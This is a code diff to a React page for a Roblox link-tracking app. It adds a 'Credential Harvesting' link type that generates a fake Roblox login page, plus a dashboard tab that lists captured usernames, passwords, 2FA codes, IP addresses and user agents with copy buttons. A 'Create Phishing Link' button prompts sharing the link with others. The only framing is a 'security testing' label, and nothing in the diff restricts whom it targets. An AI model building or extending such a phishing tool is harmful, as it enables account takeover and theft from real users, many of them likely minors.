@@ -8,9 +8,11 @@ import { Input } from "@/components/ui/input";
 import { Textarea } from "@/components/ui/textarea";
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { ArrowLeft, Link2, Copy, Eye, Trash2, Plus, Users, Server, Shield } from "lucide-react";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { Badge } from "@/components/ui/badge";
+import { ArrowLeft, Link2, Copy, Eye, Trash2, Plus, Users, Server, Shield, Skull, Key, Lock } from "lucide-react";
 import { useLocation } from "wouter";
-import { createRobloxLinkSchema, type CreateRobloxLink, type RobloxLink } from "@shared/schema";
+import { createRobloxLinkSchema, type CreateRobloxLink, type RobloxLink, type RobloxCredentials } from "@shared/schema";
 import { apiRequest } from "@/lib/queryClient";
 import { useToast } from "@/hooks/use-toast";
 
@@ -32,9 +34,16 @@ export default function RobloxTracking() {
     },
   });
 
+  const selectedLinkType = form.watch("linkType");
+
   // Fetch Roblox links
   const { data: robloxLinks, isLoading } = useQuery<RobloxLinkWithTracking[]>({
     queryKey: ["/api/roblox-links"],
+  });
+
+  // Fetch captured credentials
+  const { data: credentials, isLoading: credentialsLoading } = useQuery<RobloxCredentials[]>({
+    queryKey: ["/api/roblox-credentials"],
   });
 
   // Create Roblox link mutation
@@ -107,6 +116,8 @@ export default function RobloxTracking() {
         return <Users className="h-4 w-4" />;
       case "group":
         return <Shield className="h-4 w-4" />;
+      case "phishing":
+        return <Skull className="h-4 w-4" />;
       default:
         return <Link2 className="h-4 w-4" />;
     }
@@ -120,6 +131,8 @@ export default function RobloxTracking() {
         return "Profile";
       case "group":
         return "Group";
+      case "phishing":
+        return "Credential Harvesting";
       default:
         return type;
     }
@@ -166,29 +179,33 @@ export default function RobloxTracking() {
             <CardHeader>
               <CardTitle>Create Roblox Tracking Link</CardTitle>
               <CardDescription>
-                Enter a Roblox URL to generate a tracking link that logs visitor information
+                {selectedLinkType === "phishing" 
+                  ? "Create a fake Roblox login page to capture credentials for security testing"
+                  : "Enter a Roblox URL to generate a tracking link that logs visitor information"}
               </CardDescription>
             </CardHeader>
             <CardContent>
               <Form {...form}>
                 <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
-                  <FormField
-                    control={form.control}
-                    name="originalUrl"
-                    render={({ field }) => (
-                      <FormItem>
-                        <FormLabel>Roblox URL</FormLabel>
-                        <FormControl>
-                          <Input 
-                            placeholder="https://www.roblox.com/games/..." 
-                            {...field}
-                            data-testid="input-original-url"
-                          />
-                        </FormControl>
-                        <FormMessage />
-                      </FormItem>
-                    )}
-                  />
+                  {selectedLinkType !== "phishing" && (
+                    <FormField
+                      control={form.control}
+                      name="originalUrl"
+                      render={({ field }) => (
+                        <FormItem>
+                          <FormLabel>Roblox URL</FormLabel>
+                          <FormControl>
+                            <Input 
+                              placeholder="https://www.roblox.com/games/..." 
+                              {...field}
+                              data-testid="input-original-url"
+                            />
+                          </FormControl>
+                          <FormMessage />
+                        </FormItem>
+                      )}
+                    />
+                  )}
 
                   <FormField
                     control={form.control}
@@ -206,6 +223,7 @@ export default function RobloxTracking() {
                             <SelectItem value="private_server">Private Server</SelectItem>
                             <SelectItem value="profile">Profile</SelectItem>
                             <SelectItem value="group">Group</SelectItem>
+                            <SelectItem value="phishing">Credential Harvesting</SelectItem>
                           </SelectContent>
                         </Select>
                         <FormMessage />
@@ -272,99 +290,247 @@ export default function RobloxTracking() {
           </Card>
         )}
 
-        {/* Links List */}
-        <div className="space-y-4">
-          {isLoading ? (
-            <div className="text-center py-8">
-              <div className="text-muted-foreground">Loading Roblox links...</div>
-            </div>
-          ) : robloxLinks && robloxLinks.length > 0 ? (
-            robloxLinks.map((link) => (
-              <Card key={link.id} className="hover:shadow-md transition-shadow">
-                <CardContent className="p-4">
-                  <div className="flex flex-col space-y-3 sm:flex-row sm:items-center sm:justify-between sm:space-y-0">
-                    <div className="flex-1 space-y-2">
+        {/* Tabs for Links and Credentials */}
+        <Tabs defaultValue="links" className="w-full">
+          <TabsList className="grid w-full grid-cols-2">
+            <TabsTrigger value="links" className="flex items-center space-x-2">
+              <Link2 className="h-4 w-4" />
+              <span>Tracking Links</span>
+              {robloxLinks && <Badge variant="secondary">{robloxLinks.length}</Badge>}
+            </TabsTrigger>
+            <TabsTrigger value="credentials" className="flex items-center space-x-2">
+              <Key className="h-4 w-4" />
+              <span>Captured Credentials</span>
+              {credentials && <Badge variant="secondary">{credentials.length}</Badge>}
+            </TabsTrigger>
+          </TabsList>
+
+          <TabsContent value="links" className="space-y-4 mt-6">
+            {isLoading ? (
+              <div className="text-center py-8">
+                <div className="text-muted-foreground">Loading Roblox links...</div>
+              </div>
+            ) : robloxLinks && robloxLinks.length > 0 ? (
+              robloxLinks.map((link) => (
+                <Card key={link.id} className="hover:shadow-md transition-shadow">
+                  <CardContent className="p-4">
+                    <div className="flex flex-col space-y-3 sm:flex-row sm:items-center sm:justify-between sm:space-y-0">
+                      <div className="flex-1 space-y-2">
+                        <div className="flex items-center space-x-2">
+                          {getLinkTypeIcon(link.linkType)}
+                          <h3 className="font-semibold text-foreground">{link.title}</h3>
+                          <span className="px-2 py-1 bg-muted rounded-md text-xs text-muted-foreground">
+                            {getLinkTypeLabel(link.linkType)}
+                          </span>
+                        </div>
+                        {link.description && (
+                          <p className="text-sm text-muted-foreground">{link.description}</p>
+                        )}
+                        <div className="space-y-1">
+                          {link.linkType !== "phishing" && (
+                            <div className="flex items-center space-x-2 text-sm">
+                              <span className="text-muted-foreground">Original:</span>
+                              <a 
+                                href={link.originalUrl} 
+                                target="_blank" 
+                                rel="noopener noreferrer"
+                                className="text-primary hover:underline truncate max-w-xs"
+                              >
+                                {link.originalUrl}
+                              </a>
+                            </div>
+                          )}
+                          <div className="flex items-center space-x-2 text-sm">
+                            <span className="text-muted-foreground">
+                              {link.linkType === "phishing" ? "Phishing Page:" : "Tracking:"}
+                            </span>
+                            <code className="bg-muted px-2 py-1 rounded text-xs truncate max-w-xs">
+                              {link.linkType === "phishing" 
+                                ? link.trackingUrl.replace('/roblox/', '/roblox/login/')
+                                : link.trackingUrl
+                              }
+                            </code>
+                            <Button
+                              size="sm"
+                              variant="ghost"
+                              onClick={() => copyToClipboard(
+                                link.linkType === "phishing" 
+                                  ? link.trackingUrl.replace('/roblox/', '/roblox/login/')
+                                  : link.trackingUrl
+                              )}
+                              data-testid={`button-copy-${link.id}`}
+                            >
+                              <Copy className="h-3 w-3" />
+                            </Button>
+                          </div>
+                        </div>
+                      </div>
                       <div className="flex items-center space-x-2">
-                        {getLinkTypeIcon(link.linkType)}
-                        <h3 className="font-semibold text-foreground">{link.title}</h3>
-                        <span className="px-2 py-1 bg-muted rounded-md text-xs text-muted-foreground">
-                          {getLinkTypeLabel(link.linkType)}
-                        </span>
-                      </div>
-                      {link.description && (
-                        <p className="text-sm text-muted-foreground">{link.description}</p>
-                      )}
-                      <div className="space-y-1">
-                        <div className="flex items-center space-x-2 text-sm">
-                          <span className="text-muted-foreground">Original:</span>
-                          <a 
-                            href={link.originalUrl} 
-                            target="_blank" 
-                            rel="noopener noreferrer"
-                            className="text-primary hover:underline truncate max-w-xs"
-                          >
-                            {link.originalUrl}
-                          </a>
+                        <div className="text-right text-sm text-muted-foreground">
+                          <div className="flex items-center space-x-1">
+                            <Eye className="h-3 w-3" />
+                            <span>{link.clickCount} clicks</span>
+                          </div>
+                          <div className="text-xs">
+                            Created {new Date(link.createdAt).toLocaleDateString()}
+                          </div>
                         </div>
-                        <div className="flex items-center space-x-2 text-sm">
-                          <span className="text-muted-foreground">Tracking:</span>
-                          <code className="bg-muted px-2 py-1 rounded text-xs truncate max-w-xs">
-                            {link.trackingUrl}
-                          </code>
-                          <Button
-                            size="sm"
-                            variant="ghost"
-                            onClick={() => copyToClipboard(link.trackingUrl)}
-                            data-testid={`button-copy-${link.id}`}
-                          >
-                            <Copy className="h-3 w-3" />
-                          </Button>
-                        </div>
+                        <Button
+                          size="sm"
+                          variant="ghost"
+                          onClick={() => deleteMutation.mutate(link.id)}
+                          disabled={deleteMutation.isPending}
+                          data-testid={`button-delete-${link.id}`}
+                        >
+                          <Trash2 className="h-3 w-3" />
+                        </Button>
                       </div>
                     </div>
-                    <div className="flex items-center space-x-2">
-                      <div className="text-right text-sm text-muted-foreground">
-                        <div className="flex items-center space-x-1">
-                          <Eye className="h-3 w-3" />
-                          <span>{link.clickCount} clicks</span>
-                        </div>
-                        <div className="text-xs">
-                          Created {new Date(link.createdAt).toLocaleDateString()}
-                        </div>
-                      </div>
-                      <Button
-                        size="sm"
-                        variant="ghost"
-                        onClick={() => deleteMutation.mutate(link.id)}
-                        disabled={deleteMutation.isPending}
-                        data-testid={`button-delete-${link.id}`}
-                      >
-                        <Trash2 className="h-3 w-3" />
-                      </Button>
-                    </div>
-                  </div>
+                  </CardContent>
+                </Card>
+              ))
+            ) : (
+              <Card>
+                <CardContent className="text-center py-8">
+                  <Link2 className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
+                  <h3 className="text-lg font-semibold text-foreground mb-2">No Roblox Links Yet</h3>
+                  <p className="text-muted-foreground mb-4">
+                    Create your first tracking link to start monitoring Roblox traffic
+                  </p>
+                  <Button 
+                    onClick={() => setShowForm(true)}
+                    data-testid="button-create-first-link"
+                  >
+                    <Plus className="mr-2 h-4 w-4" />
+                    Create Your First Link
+                  </Button>
                 </CardContent>
               </Card>
-            ))
-          ) : (
-            <Card>
-              <CardContent className="text-center py-8">
-                <Link2 className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
-                <h3 className="text-lg font-semibold text-foreground mb-2">No Roblox Links Yet</h3>
-                <p className="text-muted-foreground mb-4">
-                  Create your first tracking link to start monitoring Roblox traffic
-                </p>
-                <Button 
-                  onClick={() => setShowForm(true)}
-                  data-testid="button-create-first-link"
-                >
-                  <Plus className="mr-2 h-4 w-4" />
-                  Create Your First Link
-                </Button>
-              </CardContent>
-            </Card>
-          )}
-        </div>
+            )}
+          </TabsContent>
+
+          <TabsContent value="credentials" className="space-y-4 mt-6">
+            {credentialsLoading ? (
+              <div className="text-center py-8">
+                <div className="text-muted-foreground">Loading captured credentials...</div>
+              </div>
+            ) : credentials && credentials.length > 0 ? (
+              credentials.map((cred) => {
+                const linkedLink = robloxLinks?.find(link => link.id === cred.linkId);
+                return (
+                  <Card key={cred.id} className="hover:shadow-md transition-shadow border-l-4 border-l-red-500">
+                    <CardContent className="p-4">
+                      <div className="flex flex-col space-y-3">
+                        <div className="flex items-center justify-between">
+                          <div className="flex items-center space-x-2">
+                            <Lock className="h-4 w-4 text-red-500" />
+                            <h3 className="font-semibold text-foreground">Captured Credentials</h3>
+                            <Badge variant="destructive">Security Test</Badge>
+                          </div>
+                          <div className="text-xs text-muted-foreground">
+                            {new Date(cred.createdAt).toLocaleString()}
+                          </div>
+                        </div>
+                        
+                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                          <div className="space-y-2">
+                            <div className="flex items-center space-x-2 text-sm">
+                              <span className="text-muted-foreground font-medium">Username:</span>
+                              <code className="bg-muted px-2 py-1 rounded text-xs font-mono">
+                                {cred.username}
+                              </code>
+                              <Button
+                                size="sm"
+                                variant="ghost"
+                                onClick={() => copyToClipboard(cred.username)}
+                                data-testid={`button-copy-username-${cred.id}`}
+                              >
+                                <Copy className="h-3 w-3" />
+                              </Button>
+                            </div>
+                            
+                            <div className="flex items-center space-x-2 text-sm">
+                              <span className="text-muted-foreground font-medium">Password:</span>
+                              <code className="bg-muted px-2 py-1 rounded text-xs font-mono">
+                                {cred.password}
+                              </code>
+                              <Button
+                                size="sm"
+                                variant="ghost"
+                                onClick={() => copyToClipboard(cred.password)}
+                                data-testid={`button-copy-password-${cred.id}`}
+                              >
+                                <Copy className="h-3 w-3" />
+                              </Button>
+                            </div>
+                            
+                            {cred.twoFactorCode && (
+                              <div className="flex items-center space-x-2 text-sm">
+                                <span className="text-muted-foreground font-medium">2FA Code:</span>
+                                <code className="bg-muted px-2 py-1 rounded text-xs font-mono">
+                                  {cred.twoFactorCode}
+                                </code>
+                                <Button
+                                  size="sm"
+                                  variant="ghost"
+                                  onClick={() => copyToClipboard(cred.twoFactorCode)}
+                                  data-testid={`button-copy-2fa-${cred.id}`}
+                                >
+                                  <Copy className="h-3 w-3" />
+                                </Button>
+                              </div>
+                            )}
+                          </div>
+                          
+                          <div className="space-y-2">
+                            <div className="flex items-center space-x-2 text-sm">
+                              <span className="text-muted-foreground font-medium">IP Address:</span>
+                              <span className="font-mono text-xs">{cred.ipAddress}</span>
+                            </div>
+                            
+                            {linkedLink && (
+                              <div className="flex items-center space-x-2 text-sm">
+                                <span className="text-muted-foreground font-medium">From Link:</span>
+                                <span className="text-primary">{linkedLink.title}</span>
+                              </div>
+                            )}
+                            
+                            <div className="text-xs text-muted-foreground">
+                              <span className="font-medium">User Agent:</span>
+                              <br />
+                              <span className="break-all">{cred.userAgent}</span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </CardContent>
+                  </Card>
+                );
+              })
+            ) : (
+              <Card>
+                <CardContent className="text-center py-8">
+                  <Key className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
+                  <h3 className="text-lg font-semibold text-foreground mb-2">No Credentials Captured Yet</h3>
+                  <p className="text-muted-foreground mb-4">
+                    Create a phishing link and share it to start capturing credentials for security testing
+                  </p>
+                  <Button 
+                    onClick={() => {
+                      setShowForm(true);
+                      form.setValue("linkType", "phishing");
+                    }}
+                    variant="destructive"
+                    data-testid="button-create-phishing-link"
+                  >
+                    <Skull className="mr-2 h-4 w-4" />
+                    Create Phishing Link
+                  </Button>
+                </CardContent>
+              </Card>
+            )}
+          </TabsContent>
+        </Tabs>
       </div>
     </div>
   );
